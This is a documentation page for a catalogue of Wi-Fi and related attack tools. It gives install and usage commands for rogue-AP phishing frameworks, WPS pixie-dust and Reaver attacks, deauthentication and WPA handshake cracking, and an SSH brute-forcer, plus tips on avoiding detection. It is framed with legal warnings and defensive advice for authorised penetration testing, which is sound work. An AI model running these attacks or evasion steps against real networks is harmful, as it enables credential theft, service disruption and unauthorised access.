@@ -1,0 +1,616 @@
+---
+title: 'Wireless Attack Tools'
+description: 'Wi-Fi security testing and wireless network attack tools'
+icon: 'wifi'
+---
+
+<Warning>
+  **Legal Notice**: Attacking wireless networks you don't own or without authorization is illegal. These tools are for authorized security testing only. Requires wireless adapter with monitor mode support.
+</Warning>
+
+## Overview
+
+Wireless attack tools help security professionals test the security of Wi-Fi networks, identify vulnerabilities in wireless protocols, and assess wireless infrastructure security. These tools require specialized wireless adapters that support monitor mode and packet injection.
+
+## Use Cases
+
+- **Wi-Fi Security Auditing**: Test wireless network security
+- **WPA/WPA2 Testing**: Assess encryption strength
+- **Rogue AP Detection**: Identify unauthorized access points
+- **Client Security**: Test wireless client security
+- **Protocol Analysis**: Analyze wireless protocols and vulnerabilities
+
+## Hardware Requirements
+
+<Note>
+  **Wireless Adapter**: Most built-in Wi-Fi cards don't support monitor mode. Recommended adapters:
+  - Alfa AWUS036NHA (2.4 GHz)
+  - Alfa AWUS036ACH (Dual-band)
+  - TP-Link TL-WN722N v1 (2.4 GHz)
+  - Panda PAU09 (2.4 GHz)
+</Note>
+
+## Available Tools
+
+<CardGroup cols={3}>
+  <Card title="WiFi-Pumpkin3" icon="hotspot" href="https://github.com/P0cL4bs/wifipumpkin3">
+    Rogue AP framework for MITM attacks
+  </Card>
+  
+  <Card title="Pixiewps" icon="wand-magic-sparkles" href="https://github.com/wiire/pixiewps">
+    WPS pixie dust attack tool
+  </Card>
+  
+  <Card title="BluePot" icon="bluetooth" href="https://github.com/andrewmichaelsmith/bluepot">
+    Bluetooth honeypot framework
+  </Card>
+  
+  <Card title="Fluxion" icon="tower-broadcast" href="https://github.com/FluxionNetwork/fluxion">
+    Automated MITM WPA attack
+  </Card>
+  
+  <Card title="Wifiphisher" icon="fish-fins" href="https://github.com/wifiphisher/wifiphisher">
+    Rogue AP phishing framework
+  </Card>
+  
+  <Card title="Wifite" icon="bolt" href="https://github.com/derv82/wifite2">
+    Automated wireless auditing tool
+  </Card>
+  
+  <Card title="EvilTwin (Fakeap)" icon="clone" href="https://github.com/Z4nzu/fakeap">
+    Evil twin attack with fake login page
+  </Card>
+  
+  <Card title="Fastssh" icon="network-wired" href="https://github.com/Z4nzu/fastssh">
+    Multi-threaded SSH scanner and brute-forcer
+  </Card>
+  
+  <Card title="Howmanypeople" icon="users">
+    Count nearby devices via Wi-Fi monitoring
+  </Card>
+</CardGroup>
+
+---
+
+## WiFi-Pumpkin3
+
+### Description
+
+WiFi-Pumpkin is a comprehensive rogue access point framework that creates fake networks while forwarding legitimate traffic to and from unsuspecting targets. It's designed for security testing and demonstrating MITM attacks.
+
+### Installation
+
+```bash
+# Install dependencies
+sudo apt install libssl-dev libffi-dev build-essential python3-pyqt5
+
+# Clone repository
+sudo git clone https://github.com/P0cL4bs/wifipumpkin3.git
+chmod -R 755 wifipumpkin3
+
+# Install
+cd wifipumpkin3
+sudo python3 setup.py install
+```
+
+### Running
+
+```bash
+sudo wifipumpkin3
+```
+
+### Features
+
+- Rogue access point creation
+- MITM attack framework
+- Credential harvesting
+- Traffic sniffing and manipulation
+- DNS spoofing
+- Captive portal support
+- Plugin system for extensions
+
+### Basic Usage
+
+```bash
+# Start WiFi-Pumpkin3
+wp3> set interface wlan0
+wp3> set ssid "Free WiFi"
+wp3> start
+
+# Enable plugins
+wp3> plugins
+wp3> use sniffing/credentials
+wp3> start
+```
+
+<Warning>
+  **MITM Attacks**: This tool can intercept sensitive data. Only use on networks you own or have explicit authorization to test.
+</Warning>
+
+---
+
+## Pixiewps
+
+### Description
+
+Pixiewps exploits the low or non-existing entropy of some Access Points' WPS implementation, performing what's known as the "pixie dust attack" to recover WPS PINs offline.
+
+### Installation
+
+```bash
+sudo git clone https://github.com/wiire/pixiewps.git
+sudo apt-get -y install build-essential
+cd pixiewps*/
+make
+sudo make install
+```
+
+### Usage Workflow
+
+```bash
+# 1. Put interface into monitor mode
+sudo airmon-ng start wlan0
+
+# 2. Scan for WPS-enabled networks
+wash -i wlan0mon
+
+# 3. Run Reaver with pixiewps
+reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -vvv -K 1 -f
+```
+
+### What is Pixie Dust Attack?
+
+<Accordion title="Technical Details">
+  The pixie dust attack exploits weak random number generation in some WPS implementations. Instead of trying all possible PINs:
+  
+  1. Captures WPS handshake
+  2. Analyzes entropy of nonces
+  3. Brute-forces weak PRNG offline
+  4. Recovers WPS PIN in seconds/minutes
+  
+  **Vulnerable routers**: Many older models from TP-Link, D-Link, Netgear, etc.
+</Accordion>
+
+---
+
+## BluePot
+
+### Description
+
+Bluetooth honeypot GUI framework for detecting and analyzing Bluetooth attacks. Requires at least one Bluetooth receiver.
+
+### Installation
+
+```bash
+# Download
+sudo wget https://raw.githubusercontent.com/andrewmichaelsmith/bluepot/master/bin/bluepot-0.2.tar.gz
+
+# Extract
+sudo tar xfz bluepot-0.2.tar.gz
+sudo rm bluepot-0.2.tar.gz
+```
+
+### Running
+
+```bash
+cd bluepot
+sudo java -jar bluepot.jar
+```
+
+### Requirements
+
+- Java Runtime Environment
+- Bluetooth adapter
+- Linux: `libbluetooth-dev` (Ubuntu) or `bluez-devel` (Fedora)
+
+---
+
+## Fluxion
+
+### Description
+
+Fluxion is an automated MITM attack tool that creates a fake AP, deauthenticates clients, and presents them with a phishing page to capture WPA passwords.
+
+### Installation
+
+```bash
+git clone https://github.com/FluxionNetwork/fluxion.git
+cd fluxion
+sudo chmod +x fluxion.sh
+```
+
+### Running
+
+```bash
+cd fluxion
+sudo bash fluxion.sh -i
+```
+
+### How Fluxion Works
+
+1. **Scan**: Identifies target networks
+2. **Capture**: Captures handshake (optional)
+3. **Deauth**: Disconnects clients from real AP
+4. **Fake AP**: Creates identical rogue AP
+5. **Captive Portal**: Shows fake login page
+6. **Capture**: Logs entered password
+7. **Verify**: Tests password against captured handshake
+
+<Warning>
+  **Highly Disruptive**: Fluxion performs deauthentication attacks that disconnect users. Only use during authorized testing windows.
+</Warning>
+
+---
+
+## Wifiphisher
+
+### Description
+
+Rogue Access Point framework for conducting red team engagements and Wi-Fi security testing through victim-customized web phishing attacks.
+
+### Installation
+
+```bash
+git clone https://github.com/wifiphisher/wifiphisher.git
+cd wifiphisher
+sudo python3 setup.py install
+```
+
+### Running
+
+```bash
+cd wifiphisher
+sudo wifiphisher
+```
+
+### Attack Scenarios
+
+```bash
+# Firmware upgrade phishing
+sudo wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade
+
+# OAuth login phishing
+sudo wifiphisher -aI wlan0 -jI wlan1 -p oauth-login
+
+# Browser plugin update
+sudo wifiphisher -aI wlan0 -jI wlan1 -p plugin_update
+```
+
+### Features
+
+- Targeted Wi-Fi association attacks
+- Automated victim-customized phishing
+- Credential harvesting
+- Malware delivery capabilities
+- Multiple phishing scenarios
+- Custom template support
+
+<Accordion title="Available Phishing Scenarios">
+  - **firmware-upgrade**: Fake router firmware update
+  - **oauth-login**: OAuth credential phishing
+  - **network-manager**: Network connection authentication
+  - **browser-plugin**: Fake browser update
+  - **custom**: Create your own templates
+</Accordion>
+
+---
+
+## Wifite
+
+### Description
+
+Automated wireless auditing tool that attacks multiple WEP, WPA, and WPS encrypted networks. It's designed to be user-friendly and require minimal configuration.
+
+### Installation
+
+```bash
+sudo git clone https://github.com/derv82/wifite2.git
+cd wifite2
+sudo python3 setup.py install
+```
+
+### Running
+
+```bash
+cd wifite2
+sudo wifite
+```
+
+### Usage Examples
+
+```bash
+# Scan and attack all networks
+sudo wifite
+
+# Attack WPA networks only
+sudo wifite --wpa
+
+# Use specific wordlist
+sudo wifite --dict /path/to/wordlist.txt
+
+# Attack specific BSSID
+sudo wifite --bssid AA:BB:CC:DD:EE:FF
+
+# Pixie dust attack only
+sudo wifite --wps --pixie
+```
+
+### Attack Methods
+
+- **WPA/WPA2**: Handshake capture + wordlist
+- **WPS PIN**: Brute-force or pixie dust
+- **WEP**: Various attacks (ARP replay, chopchop, etc.)
+
+<Note>
+  **Automation**: Wifite automatically selects the best attack method based on target capabilities and captured data.
+</Note>
+
+---
+
+## EvilTwin (Fakeap)
+
+### Description
+
+Creates a fake access point with a captive portal login page to capture credentials. The script automates the evil twin attack setup.
+
+### Installation
+
+```bash
+sudo git clone https://github.com/Z4nzu/fakeap.git
+```
+
+### Running
+
+```bash
+cd fakeap
+sudo bash fakeap.sh
+```
+
+### Attack Flow
+
+1. Select wireless interface
+2. Configure fake AP (SSID, channel)
+3. Start fake access point
+4. Enable captive portal
+5. Wait for credentials
+6. Credentials logged to file
+
+---
+
+## Fastssh
+
+### Description
+
+Multi-threaded SSH scanner and brute-force tool using common credentials. While not strictly a wireless tool, it's useful for testing exposed SSH services discovered on wireless networks.
+
+### Installation
+
+```bash
+sudo git clone https://github.com/Z4nzu/fastssh.git
+cd fastssh
+sudo chmod +x fastssh.sh
+sudo apt-get install -y sshpass netcat
+```
+
+### Running
+
+```bash
+cd fastssh
+
+# Scan for SSH servers
+sudo bash fastssh.sh --scan
+
+# Brute force specific target
+sudo bash fastssh.sh --target 192.168.1.100
+```
+
+---
+
+## Howmanypeople
+
+### Description
+
+Monitors Wi-Fi signals to count the number of devices (people) around you. Useful for security assessments and understanding wireless device density.
+
+### Installation
+
+```bash
+sudo apt-get install tshark
+sudo python3 -m pip install howmanypeoplearearound
+```
+
+### Running
+
+```bash
+howmanypeoplearearound
+```
+
+### Features
+
+- Passive device counting
+- MAC address tracking
+- Real-time monitoring
+- CSV output for analysis
+
+<Warning>
+  **Legal Considerations**: Monitoring wireless networks, even passively, may be illegal in some jurisdictions. Check local laws before use.
+</Warning>
+
+---
+
+## Best Practices
+
+### Pre-Attack Preparation
+
+```bash
+# 1. Verify adapter supports monitor mode
+iw list | grep "Supported interface modes" -A 8
+
+# 2. Kill interfering processes
+sudo airmon-ng check kill
+
+# 3. Enable monitor mode
+sudo airmon-ng start wlan0
+
+# 4. Verify monitor mode
+iwconfig
+```
+
+### Wireless Security Testing Methodology
+
+1. **Reconnaissance**
+   ```bash
+   # Scan for networks
+   sudo airodump-ng wlan0mon
+   
+   # Identify WPS-enabled APs
+   wash -i wlan0mon
+   ```
+
+2. **Vulnerability Assessment**
+   - Check for WEP (deprecated, easily cracked)
+   - Test WPS PIN (pixie dust, brute-force)
+   - Capture WPA handshakes
+   - Identify weak passwords
+
+3. **Exploitation**
+   - Automated tools (Wifite)
+   - Manual attacks (aircrack-ng suite)
+   - Social engineering (Wifiphisher)
+
+4. **Documentation**
+   - Log all findings
+   - Screenshot evidence
+   - Note vulnerable configurations
+
+### Avoiding Detection
+
+```bash
+# Change MAC address
+sudo macchanger -r wlan0mon
+
+# Use external antenna for distance
+# Position yourself appropriately
+
+# Minimize deauth packets
+# Use targeted attacks instead of broadcast
+
+# Monitor for security responses
+# Watch for defensive measures
+```
+
+### Common Wireless Vulnerabilities
+
+<CardGroup cols={2}>
+  <Card title="WEP Encryption" icon="unlock">
+    Deprecated protocol, can be cracked in minutes
+  </Card>
+  
+  <Card title="WPS Enabled" icon="key">
+    Vulnerable to brute-force and pixie dust attacks
+  </Card>
+  
+  <Card title="Weak Passwords" icon="lock-open">
+    Short or common passwords easily cracked
+  </Card>
+  
+  <Card title="Deauth Vulnerability" icon="triangle-exclamation">
+    WPA2 vulnerable to deauthentication attacks
+  </Card>
+</CardGroup>
+
+## Wireless Cracking Workflow
+
+### WPA/WPA2 Handshake Capture
+
+```bash
+# 1. Start monitoring
+sudo airodump-ng wlan0mon
+
+# 2. Focus on target
+sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon
+
+# 3. Deauthenticate client (in another terminal)
+sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon
+
+# 4. Crack with wordlist
+aircrack-ng -w wordlist.txt capture-01.cap
+```
+
+### WPS PIN Attack
+
+```bash
+# Reaver brute-force
+reaver -i wlan0mon -b [BSSID] -vv
+
+# Reaver with pixie dust
+reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -vvv -K 1
+
+# Bully alternative
+bully wlan0mon -b [BSSID] -c [CHANNEL]
+```
+
+## Defensive Recommendations
+
+After testing, recommend these security measures:
+
+1. **Disable WPS** - Major vulnerability vector
+2. **Use WPA3** - Latest encryption standard
+3. **Strong Passwords** - 16+ characters, random
+4. **MAC Filtering** - Additional layer (not primary security)
+5. **Hide SSID** - Obscurity, not security (still test)
+6. **Network Segmentation** - Separate guest network
+7. **Monitor for Rogues** - Regular wireless audits
+8. **Update Firmware** - Patch known vulnerabilities
+
+## Troubleshooting
+
+<Accordion title="Monitor Mode Won't Enable">
+  ```bash
+  # Kill conflicting processes
+  sudo airmon-ng check kill
+  
+  # Manually set monitor mode
+  sudo ip link set wlan0 down
+  sudo iw wlan0 set monitor control
+  sudo ip link set wlan0 up
+  
+  # Check driver support
+  lsusb  # Identify adapter
+  dmesg | tail  # Check kernel messages
+  ```
+</Accordion>
+
+<Accordion title="No Handshake Captured">
+  **Solutions:**
+  - Wait for legitimate client to connect
+  - Increase deauth packet count
+  - Try different channels
+  - Ensure client is actively connected
+  - Check if AP uses 802.11w (protected frames)
+</Accordion>
+
+<Accordion title="Adapter Not Detected">
+  **Check:**
+  ```bash
+  # Verify USB connection
+  lsusb
+  
+  # Check wireless interfaces
+  iwconfig
+  
+  # Install drivers if needed
+  sudo apt install realtek-rtl88xxau-dkms
+  ```
+</Accordion>
+
+## Additional Resources
+
+- [Aircrack-ng Documentation](https://www.aircrack-ng.org/)
+- [Wireless Pentesting Guide](https://www.hackingarticles.in/wireless-penetration-testing/)
+- [WiFi Pumpkin3 Wiki](https://github.com/P0cL4bs/wifipumpkin3/wiki)
+- [WPA3 Security Analysis](https://www.krackattacks.com/)
+
+<Warning>
+  **Final Reminder**: Wireless attacks are highly regulated. Unauthorized access to wireless networks can result in severe legal penalties. Always obtain proper authorization and document your testing scope.
+</Warning>
